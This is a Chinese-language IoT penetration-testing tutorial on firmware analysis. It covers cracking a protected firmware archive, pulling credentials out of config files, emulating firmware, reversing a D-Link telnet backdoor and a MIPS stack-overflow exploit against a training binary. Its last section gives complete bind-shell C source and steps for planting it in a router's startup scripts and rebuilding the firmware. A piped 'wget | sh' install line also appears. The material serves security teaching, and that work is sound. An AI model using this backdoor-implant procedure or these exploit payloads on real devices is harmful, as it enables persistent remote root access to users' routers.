让我们开始分析固件，看看我们是否能够识别出任何敏感信息或后门。

我们将用于此练习的固件是版本为`DWR-932_fw_revB_2_02_eu_en_20150709`的 D-Link DWR 932B。这些漏洞是由安全研究人员*Gianni Carabelli*和*Pierre Kim*发现的：

1.  第一步是从固件中提取文件系统。但是，在这种情况下，固件是一个受密码保护的 ZIP 文件。这种情况下，可以使用 fcrackzip 等实用程序来破解密码，密码被发现是 UT9Z。这也显示在下面的截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/eef7ca24-c6fb-4a96-908b-3c5a62efd6fe.png)

1.  一旦我们有了固件映像，我们可以使用 Binwalk 来提取固件 ZIP 文件中存在的 yaffs2 文件系统。您可以使用 yaffs2 特定工具来解压文件系统，或者简单地使用 Binwalk 也可以完成任务。

1.  在`yaffs2-root`文件夹中，我们将看到整个文件系统，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0102900b-ed0e-4f1a-8fc1-fc88c4353b05.png)

1.  从这里开始，我们可以开始浏览各个目录，并查看从安全角度看起来有趣的文件。我们可以首先运行一个`find`查询，查找所有`.conf`文件，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f410244b-8d4e-4cd0-a4f0-31e9554e5a83.png)

1.  例如，这是`wpa-supplicant.conf`文件中的内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8d9c7042-7d31-438a-9767-6c98cd1cee9c.png)

1.  让我们看看其他文件，比如`inadyn-mt.conf`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f68a1e86-4bc6-4f1f-9e7a-8915dcef2aa7.png)

令人惊讶的是，这个文件包含了高度敏感的信息，根本不应该被访问。正如我们从前面的屏幕截图中所看到的，这个文件存储了路由器的 no-IP 配置，包括用于[`www.no-ip.com`](https://www.no-ip.com)访问的用户名和密码组合。

这就是我们如何在固件中找到隐藏的敏感信息。您显然可以继续寻找更多，并在固件文件系统中识别更多敏感信息。

现在我们知道如何对固件进行手动分析后，我们将继续通过自动化方法来识别漏洞。为此，我们将使用一个名为 Firmwalker 的工具，这个工具是由*Craig Smith*编写的，它通过静态分析帮助识别固件中一些常见的敏感信息。

1.  要设置它，我们只需要克隆 Firmwalker 的 GitHub 存储库，如下所示：

```
git clone https://github.com/craigz28/firmwalker.git
```

1.  一旦我们克隆了 Firmwalker 的 GitHub 存储库，我们只需要运行`./firmwalker.sh`脚本，然后跟随提取的文件系统位置，如下所示：

```
./firmwalker.sh ~/lab/firmware/dlink/r2/v2/_2K-mdm-image-mdm9625.yaffs2.extracted/yaffs-root

```

1.  Firmwalker 脚本为我们识别了许多不同的内容，包括额外的二进制文件、证书、IP 地址、私钥等。它还将输出存储在一个名为`firmwalker.txt`的文件中（除非用户指定了不同的文件），其外观如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/61028b37-9e0b-4a02-a297-525c56bd217f.png)

一旦我们有了 Firmwalker 生成的报告，我们可以逐个查看所有不同的文件并进一步分析它们。在某些情况下，您还需要对 ARM 和 MIPS 架构的二进制文件进行逆向工程，以更好地理解它们并识别漏洞。

# 它是如何工作的...

分析和理解文件系统及其内部内容完全取决于您的手动评估技能。这就是您能够识别漏洞的方法。即使在使用各种工具时，您也会意识到，最终归根结底是手动分析二进制文件或文件，并找出其中的漏洞。

# 还有更多...

要更深入地分析固件文件系统内容，您还可以使用固件差异技术，通过它您可以比较一个固件与其先前版本，并查看其中的差异。这将使您能够了解新版本中进行的安全修复和修改，并识别以前版本中甚至未公开的安全问题。

我们还可以对固件文件系统内容进行的另一项操作是查看已使用的各种库和组件，看看这些组件是否是带有漏洞的过时版本。

# 另请参阅

+   要分析固件文件系统内容，还可以阅读更多关于二进制分析和逆向工程的内容。熟悉 Linux 二进制分析、调试和在 ARM 和 MIPS 等平台上的反汇编。

# 用于动态分析的固件模拟

在使用物联网设备时，其中一个限制是我们无法在没有实际设备访问权限的情况下进行大量测试和利用。然而，在本节中，我们将讨论一种方法，您可以模拟您的固件，并与模拟设备进行交互，就像它是实际放置在您的网络上的设备一样。

# 准备就绪

为了模拟固件，我们将使用一种名为**固件分析工具包**（**FAT**）的脚本，这个脚本是由本书的作者编写的。FAT 使用 Firmadyne 来执行固件映像的模拟。

Firmadyne 使用的基础实用程序是 QEMU，它允许用户模拟整个系统架构并在其上运行内容。它还利用了工具作者编写的其他脚本，例如位于[`github.com/firmadyne/libnvram`](https://github.com/firmadyne/libnvram)的 NVRAM 模拟器。它还使用我们之前讨论过的 Binwalk 等工具，从固件中提取文件系统，然后进行模拟。

让我们继续克隆 FAT GitHub 存储库并设置它，使实验室准备好进行模拟。强烈建议在基于 Ubuntu 的系统上执行此操作，以避免在模拟过程中出现任何问题。

# 如何做...

以下是步骤：

1.  我们将通过以下链接[`github.com/attify/firmware-analysis-toolkit/`](https://github.com/attify/firmware-analysis-toolkit/)开始克隆 FAT 存储库的设置：

```
git clone --recursive https://github.com/attify/firmware-analysis-toolkit.git
cd firmware-analysis-toolkit && sudo ./setup.sh

```

这也将设置 Firmadyne 用于存储有关固件的信息和将来管理的数据库。数据库的密码将设置为`firmadyne`。

一旦您设置好了一切，就该是我们选择固件并模拟它，看看我们能够用模拟的固件执行什么了。

对于这个练习，我们将使用 D-Link 为其无线 PoE 接入点提供的固件 DWP2360b。

1.  我们需要做的第一件事是运行`./fat.py`，然后它会要求您输入固件名称和固件镜像的品牌。这个固件品牌镜像纯粹是为了数据库目的，这样我们以后如果需要的话就可以在数据库中查看我们模拟了哪个品牌的固件。运行后，它将显示如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/c7a7bac4-badb-42c8-9ce0-57fe89b8cf5a.png)

1.  它会几次要求您输入数据库密码，我们已将其设置为`firmadyne`。一旦完成初始处理，创建图像，设置网络并获取 IP 地址，它将显示 FAT 向您显示 IP 地址并提到固件现在已经被模拟，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/41b28add-4f71-4fc8-a1ae-c7f515a06b9e.png)

1.  一旦我们有了 IP 地址，我们可以简单地在浏览器中打开它，我们将看到路由器登录页面，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/edb94a5b-10f3-40d8-9b2a-4206b23a881c.png)

这就是我们如何在没有访问设备的情况下使用 FAT 来模拟固件。

# 工作原理...

前面的模拟是基于 QEMU 和 NVRAM 模拟器的。NVRAM 是固件访问以获取设备信息的组件。然而，由于没有物理设备存在，这将导致错误或服务崩溃。这就是 NVRAM 模拟器发挥作用的地方。Firmadyne 工具包还修改固件以进行调试，以便用户访问控制台。

以下是 FAT 脚本中正在发生的事情：

1.  从固件中提取文件系统。

1.  获取固件的架构。

1.  制作所需的镜像。

1.  设置网络。

1.  模拟镜像。

所有这些步骤都可以手动执行，但是拥有像 FAT 这样的脚本可以加快速度。

# 还有更多...

进行模拟的另一种方法是手动下载适当架构的 Debian 镜像，并将文件从固件复制到新创建的 Debian 实例中，然后使用 Chroot 运行 Web 服务器（或正在测试的组件）。您可以从[`people.debian.org/~aurel32/qemu/`](https://people.debian.org/~aurel32/qemu/)下载现有的 Debian 镜像。

# 开始使用 ARM 和 MIPS

现在我们知道如何模拟固件并进行基本分析，您经常会发现自己遇到需要进行额外分析的各种二进制文件。在一本书中不可能涵盖嵌入式设备可能的所有不同架构，我们将专注于两种流行的架构-ARM 和 MIPS。

然而，我们只会研究 MIPS 的利用，并稍微了解 ARM 的逆向工程。从利用的角度来看，ARM 和 MIPS 非常相似，学习一种架构将为您提供另一种架构的基础知识和基本理解。

# 准备工作

我们将从对 D-Link 固件中发现的后门进行非常基本的分析开始我们的二进制分析之旅。这个后门是由*Pierre Kim*发现的。要识别这个后门，需要对基于 ARM 的二进制文件有一个基本的逆向工程概念。尽管我们不会深入讨论寄存器和体系结构（因为我们将在 MIPS 体系结构中进行讨论），但这一部分将帮助您了解分析二进制文件并识别低悬漏洞的过程。

在这种情况下，我们将使用 D-Link DWR 932B 设备的固件。一旦我们使用 Binwalk 提取了这个固件，我们注意到有一个名为 appmgr 的二进制文件，这就是我们感兴趣的内容。

我们可以使用您熟悉的任何反汇编器 - Radare2、IDA、Hopper 等。在这种情况下，我们将使用 Hopper 来反向工程 appmgr 二进制文件，这是一个 ARM Little Endian 二进制文件。

# 如何做...

我们将使用 Hopper 的伪代码生成功能来更好地理解它。以下是步骤：

1.  让我们加载二进制文件到 Hopper 进行分析：</li>

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/25f7b2fd-5c59-42fb-8565-44589dba8e7e.png)

1.  一旦我们加载了二进制文件，我们就可以搜索`telnet`字符串，然后就能在代码示例中的某个地方看到`telnet`的提及：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/d31c904e-953f-4f75-857c-d5f465e0a42a.png)

在字符串中查找 telnet 实例

1.  为了找出它是从哪里调用的，我们可以右键单击字符串，然后选择引用地址，这将显示调用它的位置和指令。在这种情况下，如果我们引用地址，我们发现它是从`0x13048`调用的，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f8e566bb-1585-4bbf-9ee2-9e1a652d0e1e.png)

1.  双击地址将带我们到所提到的地址，这种情况下是`0x13048`。一旦我们到达地址，我们可以看到整个反汇编，以及通过点击“伪代码模式”按钮生成伪代码。这也显示在下面的截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/4f94c593-3dbd-49ec-b969-364bdc0d2605.png)

从反汇编中访问伪代码

1.  伪代码功能对我们非常有用，因为它让我们将反汇编视为一个逻辑程序，这样对我们来说更有意义，如果我们对反汇编不是非常熟悉的话。在这种情况下，伪代码的内容如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/b60d7347-bc03-4420-9aad-952a0373edde.png)

正如我们从前面的截图中所看到的，它对字符串`HELODBG`进行了`strncmp`。您可能已经知道，`strncmp`用于字符串比较，在这种情况下是检查二进制文件所需的字符串，以启动 Telnet，这一点从高亮的框中可以看出。

因此，我们可以自信地说，appmgr 后门寻找字符串`HELODBG`，一旦接收到该字符串，就会启动带有`bin/sh` shell 的 Telnet。

这就是我们对 ARM 二进制文件进行非常基本分析的方式，可以用来查找敏感信息或漏洞，以及后门。

# 还有更多...

现在您知道如何对 ARM 二进制文件进行基本分析，我们还建议您阅读更多关于 ARM 汇编和其体系结构的内容。对汇编指令和底层体系结构的知识和理解将帮助您更好地理解反汇编，即使在伪代码无法帮助的情况下也是如此。

# 利用 MIPS

现在我们已经对如何反向工程二进制文件有了基本的了解，是时候深入了解利用和理解大多数 IoT 设备所基于的平台的体系结构了。为了获得基本的理解，我们现在只关注 MIPS，但强烈建议您使用相同的概念并在基于 ARM 的体系结构上进行利用。

# 准备工作

进行 MIPS 利用，我们主要会使用 QEMU 和 chroot 技术，这是我们在本章前面简要介绍过的。我们将研究如何在 MIPS 二进制文件上执行缓冲区溢出利用，并改变程序执行流程，使其执行我们想要的操作，而不是二进制文件原本应该执行的操作。目前我们不会涉及**返回导向编程**（**ROP**）等概念，保持简单。

# 如何做...

对于这个练习，我们将需要并使用以下工具和实用程序：

+   **可恶的易受攻击路由器固件**（**DVRF**）-可从 GitHub URL 下载

+   GDB-Multiarch

+   **GDB 增强功能**（**GEF**）

+   QEMU

+   chroot

+   IDA Pro/Radare2（可选）

让我们逐个了解它们，并看看如何设置它们。让我们从以下 URL 下载 DVRF 固件：[`github.com/praetorian-inc/DVRF/tree/master/Firmware`](https://github.com/praetorian-inc/DVRF/tree/master/Firmware)。

DVRF 是由*b1ack0wl*编写的固件，适用于基于 MIPS 的平台。尽管该固件是为 Linksys E1550 设计的，但可以在使用 QEMU 的模拟环境中运行，也包括执行利用：

1.  现在我们有了固件，让我们继续安装 GDB（GNU 调试器）和 GEF，以便在利用过程中进行调试：

```
sudo apt install gdb-multiarch 
# Installing GEF 
sudo pip3 install capstone unicorn keystone-engine
wget -q -O- https://github.com/hugsy/gef/raw/master/gef.sh | sh  
```

还要确保您的系统上安装了所需的 QEMU 软件包。现在我们已经准备就绪，让我们继续使用二进制仿真来运行其中一个二进制文件，利用 QEMU 的功能。

1.  为此，我们需要首先使用 Binwalk 从固件中提取文件系统，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/29ca73c7-dc1e-45d5-88c4-50307da2536a.png)

1.  一旦我们提取了文件系统，我们可以将相应架构的 QEMU 二进制文件复制到我们的根文件夹中，本例中是`squashfs-root`，如下所示。但在这之前，让我们确认一下我们的目标二进制文件是否是针对 MIPS 架构的二进制文件：

```
>> readelf -h pwnable/Intro/stack_bof_01
ELF Header:
Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
Class:                             ELF32
Data:                              2's complement, little endian
Version:                           1 (current)
OS/ABI:                            UNIX - System V
ABI Version:                       0
Type:                              EXEC (Executable file)
Machine:                           MIPS R3000
Version:                           0x1
Entry point address:               0x400630
Start of program headers:          52 (bytes into file)
Start of section headers:          3900 (bytes into file)
Flags:                             0x50001007, noreorder, pic,       
cpic, o32, mips32
Size of this header:               52 (bytes)
Size of program headers:           32 (bytes)
Number of program headers:         6
Size of section headers:           40 (bytes)
Number of section headers:         29
Section header string table index: 26
```

1.  如前面的截图所示，我们的二进制文件是针对 MIPS 架构的小端格式。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/641cb935-8cb4-4238-9eb7-a8b85b7d568d.png)

1.  现在让我们继续将 MIPS 小端（mipsel）的 QEMU 二进制文件复制到我们当前的 squashfs-root 文件夹中：

```
cp $(which qemu-mipsel-static) .

```

1.  一旦我们将`qemu-mipsel-static`复制到当前目录，我们就可以使用更改根（`chroot`）实用程序以及 QEMU 来仿真并运行二进制文件，同时让二进制文件相信它的根文件夹是我们运行命令的当前文件夹。可以使用以下命令实现：

```
Sudo chroot . ./qemu-mipsel-static pwnable/Intro/stack_bof1  
```

1.  如下截图所示，我们能够运行这个二进制文件，尽管它最初是为另一种架构设计的。这是通过 QEMU 的仿真功能和`chroot`的更改根功能实现的。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/6d12f136-9c52-49f4-bbb4-12bc7c5c6438.png)

1.  如我们从命令的输出中所见（如前面的截图所示），这个二进制文件需要参数才能运行。此外，如果我们查看二进制文件的源代码，我们会发现这个二进制文件容易受到基于堆栈的缓冲区溢出漏洞的影响。以下是`stack_bof1`二进制文件的源代码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/3967adf3-6e71-4e61-a766-aecd601750aa.png)

如前面的截图所示，`buf`缓冲区容易受到缓冲区溢出的影响，我们的溢出目标是修改程序流程，使其指向`dat_shell`的地址，以便从中利用此漏洞获得 shell。

1.  让我们通过使用 QEMU 和 chroot 以及附加的`-g`标志来调试这个程序，这将使 GDB 连接到进程，如下所示：

```
sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof1
```

1.  如您从以下截图中所见，程序执行已暂停，现在正在等待调试器连接：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/4d1a23fe-2385-469e-ba1c-e20ae4028d12.png)

1.  现在执行已经暂停，我们可以启动 GDB 并设置目标为远程以及我们刚刚分配的端口。此外，我们将不得不将架构设置为 MIPS，以便在需要时能够正确地反汇编二进制文件：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/9b7072b5-d229-48d0-9810-25ce3f9fa8e9.png)

1.  一旦连接了目标，您会发现进程已暂停，可以通过输入`c`来恢复。 

1.  我们还可以通过执行`info functions`来查看二进制文件中可用函数的列表，并从我们的渗透测试角度确定哪些函数可能是有趣的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/164ed18f-6f17-48c6-af4a-c559508756d1.png)

1.  让我们继续反汇编`main`函数并看看它的样子。为此，我们可以简单地执行`disass main`。

1.  正如我们从下面的屏幕截图中看到的，我们能够看到`main`函数的反汇编：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/4f2ec92c-46c9-4ad0-95fe-59c198e0edd1.png)

如果您熟悉一些指令，您会发现这些指令很有用。反汇编以地址、指令和操作数的格式呈现。

MIPS 共有 32 个通用寄存器，包括`$zero`、`$at`、`$v0-$v1`、`c`、`$t0-$t9`、`$s0-$s7`、`$k0`、`$k1`、`$gp`、`$ra`、`$fp`和`$ra`。在所有这些寄存器中，`$a0-$a3`用于存储函数的参数，`$t0-$t9`用于临时数据存储，`$gp`是全局区指针（我们在利用过程中尽量不修改 GP），`$sp`是堆栈指针，`$fp`是帧指针，`$ra`是返回地址。还有一个额外的特殊目的寄存器称为**程序计数器**（**PC**），它存储下一条指令的内存地址，即当前正在执行的指令的下一条指令。

要控制基于 MIPS 的二进制程序的执行流程，我们只关心两个寄存器 - RA 和 PC。当处理基于 MIPS 的二进制文件时，您会意识到控制 PC 通常比 RA 更困难。因此，在这个练习中，我们将专注于控制 RA。

1.  由于我们知道我们正在处理的当前二进制文件`socket_bof`容易受到基于堆栈的缓冲区溢出的影响，让我们用一个极大的参数来运行它。为了生成参数，我们将使用 GEF 的模式创建功能，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/82bddf25-498c-4bd3-9b7b-29cad377e0fe.png)

1.  一旦我们生成了模式，我们可以使用之前生成的参数运行`stack_bof_01`，并查看是否能够溢出 RA。下面的屏幕截图显示了使用从 GEF 生成的自定义 300 字符长的参数运行程序：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0b82fc17-7a22-45a0-91b0-b797953262cf.png)

1.  正如预期的那样，由于`-g`标志，二进制执行状态已暂停，并且正在等待调试器连接。现在打开 GEF 终端窗口，输入`target`，如下面的命令和屏幕截图所示：

```
target remote 127.0.0.1:1234  
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/843e9d47-e5fc-44db-85c2-9993d6ceaa22.png)

1.  一旦您设置了`target`，您可以按`c`，这将使程序继续执行，直到完成或遇到断点或异常为止。如下面的屏幕截图所示，程序遇到了`SIGSEGV`错误：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/bf792834-36fc-4443-bfa6-41eadb08f11c.png)

GEF 还显示了在捕获异常时堆栈和寄存器的整个状态。在我们的情况下，我们可以看到 RA 被`0x63616162`覆盖，这只是`baac`的十六进制表示。

现在我们有了上述信息，让我们使用模式搜索功能来找到覆盖 RA 的字节的偏移量。有了这个，我们将能够找出我们应该放置恶意地址的位置，并控制程序的执行流程。

1.  为了做到这一点，我们可以使用命令`pattern search RA-overflown-bytes-in-hex`，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/bfe00194-7601-4719-bc22-633919744bf2.png)

从前面的屏幕截图中可以看到，我们能够找到溢出寄存器 RA 的字符的偏移量，在这种情况下是`204`。这意味着我们需要`204`字节的垃圾来填满 RA 之前的所有内容，接下来的`4`字节将是用来覆盖 RA 的值。

1.  如果您还记得我们这次练习的目标是修改程序执行流程并调用`dat_shell`函数，而这个函数在程序的正常流程中不会被调用。为了找到`dat_shell`的地址，我们可以打印`dat_shell`，或者我们可以反汇编并查看起始地址。这可以通过使用`disass function-name`命令来完成，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/28dcea40-224e-48d7-b1e2-80f606697a73.png)

从前面的屏幕截图中可以看到，`dat_shell`函数从`0x00400950`地址开始。然而，前三条指令使用了**全局指针**（**GP**），这不是我们此刻想要处理的。这就是为什么我们会跳转到`0x0040095c`而不是`0x00400950`的原因。

1.  因此，让我们继续运行带有`204`个字符的垃圾，后跟地址`0x0040095c`的二进制文件。这次，我们还删除了`-g`标志，并直接运行如下：

```
sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 "$(python -c "print 'A'*204 +  '\x5c\x09\x40'")"  
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/ac22f79f-9b17-4b15-a3b3-d300b6c56a43.png)

从前面的屏幕截图中可以看到，二进制文件现在已经按我们的要求执行了`dat_shell`函数。这就是我们在基于 MIPS 的平台上执行基于堆栈的缓冲区溢出的方法。

# 它是如何工作的...

缓冲区溢出的整个基本概念是能够在缓冲区中放入比预期输入更多的字符，并以这种方式控制可能存在于堆栈上的寄存器。这也可以用于跳转到 shellcode 的位置或系统的`libc`库，并执行额外的有效载荷。

# 还有更多...

尽管我们可以在这个有漏洞的二进制文件中执行利用，但在现实世界的情况下，您可能会遇到更复杂的情况。其中之一是有趣的函数不会位于二进制文件内，您将不得不跳转到系统以执行`bin/sh`，或者创建一个 ROP 链来执行您的 shellcode。

# 使用固件修改工具（FMK）来设置后门

在利用过程中经常有用的技术之一是修改固件的能力。这可以通过从固件中提取文件系统，修改内容，然后将其重新打包成新的固件来实现。然后可以将这个新的固件刷入设备。

# 准备工作

为了修改固件，我们将使用一个名为 FMK 的工具，由*Jeremy Collake*和*Craig Heffner*编写。 FMK 利用 Binwalk 和其他工具从固件中提取文件系统，并为我们提供重新打包修改后的文件系统到新固件二进制文件的能力。

FMK 可以从[`github.com/brianpow/firmware-mod-kit/`](https://github.com/brianpow/firmware-mod-kit/)下载，或者如果您之前克隆了 FAT 工具，它可能已经存在于您的系统中。下载完成后，我们需要固件来进行尝试。为了简化事情，以便阅读本书的每个人都可以在不购买硬件的情况下复制以下步骤，我们将使用可以在 FAT 中很好地模拟的固件。

# 如何做...

以下是步骤：

1.  在这种情况下，我们将使用 D-Link 的 DIR-300 路由器的固件。为了从固件中提取文件系统，我们将使用 FMK 目录中的`extract-firmware.sh`脚本，而不是使用 Binwalk，如下所示：

```
./extract-firmware.sh Dlink_firmware.bin  
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8ce54461-9a12-4f50-81c5-5b12f5bddde9.png)

一旦我们提取了固件，它将为我们包含一个新目录，其中包括`rootfs`、`image_parts`和`logs`文件夹。对于大多数后门和固件修改目的，我们只关心`rootfs`文件夹。

`rootfs`文件夹包含固件的整个文件系统。我们所需要做的就是为固件的架构创建一个后门，然后找到一种在固件启动时自动调用它的方法。

1.  让我们首先找出固件是为哪种架构而设计的。我们可以通过对任何固件二进制文件（如 BusyBox）进行`readelf`来找出这一点，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0cecc090-c60e-40b6-bb9e-82196ef4834e.png)

1.  正如我们从前面的截图中看到的，它是基于 MIPS Little Endian 架构。这意味着我们需要为 MIPS Little Endian 格式创建和编译一个后门。以下是我们将要使用的后门，最初由*Osanda Malith*编写：

```
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 

#define SERVER_PORT  9999 
 /* CC-BY: Osanda Malith Jayathissa (@OsandaMalith) 
  * Bind Shell using Fork for my TP-Link mr3020 router running busybox 
  * Arch : MIPS 
  * mips-linux-gnu-gcc mybindshell.c -o mybindshell -static -EB -march=24kc 
  */ 
int main() { 
   int serverfd, clientfd, server_pid, i = 0; 
   char *banner = "[~] Welcome to @OsandaMalith's Bind Shell\n"; 
   char *args[] = { "/bin/busybox", "sh", (char *) 0 }; 
   struct sockaddr_in server, client; 
   socklen_t len; 

   server.sin_family = AF_INET; 
   server.sin_port = htons(SERVER_PORT); 
   server.sin_addr.s_addr = INADDR_ANY; 

   serverfd = socket(AF_INET, SOCK_STREAM, 0); 
   bind(serverfd, (struct sockaddr *)&server, sizeof(server)); 
   listen(serverfd, 1); 

    while (1) { 
         len = sizeof(struct sockaddr); 
         clientfd = accept(serverfd, (struct sockaddr *)&client, &len); 
        server_pid = fork(); 
        if (server_pid) { 
         write(clientfd, banner,  strlen(banner)); 
           for(; i <3 /*u*/; i++) dup2(clientfd, i); 
           execve("/bin/busybox", args, (char *) 0); 
           close(clientfd); 
         } close(clientfd); 
    } return 0; 
} 
```

一旦我们有了代码，我们就可以使用 Buildroot for MIPSEL，并使用使用 Buildroot 构建的交叉编译器进行编译。我们不会详细介绍设置 Buildroot 的过程，因为这个过程非常简单，并且已经在文档中有所记录。

1.  一旦我们为 MIPSEL 创建了交叉编译器，我们就可以将`bindshell.c`编译为`bindshell`二进制文件，然后将其放置在固件的提取文件系统中：

```
./mipsel-buildroot-linux-uclibc-gcc bindshell.c -static -o bindshell  
```

下一步是寻找我们可以将这个二进制文件放置在文件系统中的位置，以及如何在启动时自动启动。这可以通过查看其中一个在启动时会自动调用的脚本来完成。

1.  查看文件系统后，我们可以将二进制文件添加到`etc/templates/`中，并可以从位于`/etc/scripts/`的名为`system.sh`的脚本中引用它，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8e331f34-ed6f-4667-b80c-5c87907c098f.png)

1.  现在，让我们继续根据这个修改构建新的固件，使用`build-firmware.sh`脚本，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/c913fb64-af2c-4e09-8fb2-c8e2d654b37e.png)

一旦完成构建过程，它将创建新的固件，并将其放置在`firmware-name/`位置，命名为`new-firmware.bin`。

1.  一旦我们有了新的固件映像，我们就可以将这个固件复制到我们的 FAT 目录中，并进行仿真以验证我们添加的后门是否有效。这可以通过与我们之前用于仿真的相同步骤来完成。这也显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/aac333e5-dc78-4677-adf0-ed215872c634.png)

正如我们从前面的截图中看到的，它给了我们一个 IP 地址`192.168.0.1`，我们现在可以尝试访问。但更有趣的是，让我们看看我们放置在固件中的后门 bindshell 是否激活。

1.  让我们尝试在前面的 IP 上运行一个连接到端口`9999`的 Netcat，并看看它是否有效：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/3cea80f6-a14b-4bd8-b90e-c556ff4847ac.png)

现在，由于我们修改并放置在固件中的后门，我们在设备上有了完整的 root shell。从这里，我们可以修改其他设备配置，或者简单地使用它来远程访问运行我们修改后的恶意固件的任何设备。

# 它是如何工作的...

修改固件的能力对攻击者来说是非常强大和有用的。这使得攻击者能够绕过保护机制，移除安全功能等。由于诸如 FMK 之类的工具，攻击者可以非常容易地向任何物联网设备固件中添加自己的恶意软件或后门，然后用户可以在世界任何地方使用它。

这也是固件签名和校验和验证非常重要的原因之一，以防止因恶意或修改的固件而引起的攻击。
